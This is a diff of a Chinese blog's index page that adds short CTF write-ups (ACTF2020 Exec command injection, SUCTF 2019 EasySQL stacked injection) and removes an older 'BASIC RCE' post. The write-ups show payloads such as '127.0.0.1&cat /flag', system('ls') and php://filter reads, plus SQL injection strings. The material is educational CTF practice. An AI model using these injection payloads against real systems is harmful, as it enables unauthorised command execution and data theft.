@@ -286,6 +286,153 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/19/20210119/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花间一壶酒">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/01/19/20210119/" itemprop="url">（ACTF2020 新生赛）Exec+（SUCTF 2019）EasySQL</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-19T17:17:45+08:00">
+                2021-01-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p><img src="https://img-blog.csdnimg.cn/20210117215946711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">随意ping一下<br><img src="https://img-blog.csdnimg.cn/2021011722001735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">尝试一下获取flag <code>127.0.0.1&amp;cat /flag</code><br><img src="https://img-blog.csdnimg.cn/20210117220630990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><img src="https://img-blog.csdnimg.cn/20210119222523465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">有题目可知是SQL<br><img src="https://img-blog.csdnimg.cn/20210119222718169.png" alt="在这里插入图片描述">堆叠注入，查库<br><img src="https://img-blog.csdnimg.cn/20210119222829184.png" alt="在这里插入图片描述">查表<br><img src="https://img-blog.csdnimg.cn/202101192229107.png" alt="在这里插入图片描述">发现flag，查flag，<code>1;show columns from Flag;</code><br><img src="https://img-blog.csdnimg.cn/2021011922301727.png" alt="在这里插入图片描述"><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42373127/article/details/88866710">MySQL中sql_mode参数</a></p>
+<p>修改sql_mode，将其设置为PIPES_AS_CONCAT，作用是将”||”作为字符串连接符而非或运算符，修改后实际语句为<code>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;SELECT 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210119223151390.png" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/18/20210118/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1688,160 +1835,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/28/BASIC%20RCE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="花间一壶酒">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/11/28/BASIC%20RCE/" itemprop="url">BASIC RCE</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-28T15:47:45+08:00">
-                2020-11-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="BASIC-RCE"><a href="#BASIC-RCE" class="headerlink" title="BASIC RCE"></a>BASIC RCE</h2><p>RCE英文全称：remote command/code execute（远程命令/代码执行漏洞）<br>分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43486981/article/details/107997468">https://blog.csdn.net/weixin_43486981/article/details/107997468</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
-<h2 id="basic-rce"><a href="#basic-rce" class="headerlink" title="basic rce"></a>basic rce</h2><p><img src="https://img-blog.csdnimg.cn/20201128030212911.png" alt="在这里插入图片描述"><br>PHP代码显示，要求将命令赋值给a然后执行,<br>先查看一下根目录文件 /?a=system(“ls”);<br>！<strong>切记最后的分号不可省略！</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128030344343.png" alt="在这里插入图片描述"><br>发现f111a9.php，试着打开php文件, /?a=system(“cat f111a9.php”); 发现打不开。</p>
-<p>应该是文件中包含特殊字符，使用管道运行base64加密内容</p>
-<p>/?a=system(“cat f111a9.php|base64”);</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128030707901.png" alt="在这里插入图片描述">进行解码,得到flag：flag{Web_xiao_fen_dui}<br><img src="https://img-blog.csdnimg.cn/20201128030752296.png" alt="在这里插入图片描述"></p>
-<h2 id="basic-rce2"><a href="#basic-rce2" class="headerlink" title="basic rce2"></a>basic rce2</h2><p><img src="https://img-blog.csdnimg.cn/20201128031321970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先查看一下根目录文件/?Rem=system(“ls”); 发现<br><img src="https://img-blog.csdnimg.cn/20201128031500371.png" alt="在这里插入图片描述"><br>但题目中</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128032721390.png" alt="在这里插入图片描述"></p>
-<p>过滤了more、less等，直接用include进行包含</p>
-<p>?Rem=include $_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128032731840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行解码,得到flag</p>
-<p>flag{oh_Rem_is_so_cute~}</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1892,7 +1885,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-count">62</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1914,7 +1907,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">87</span>
+                  <span class="site-state-item-count">88</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
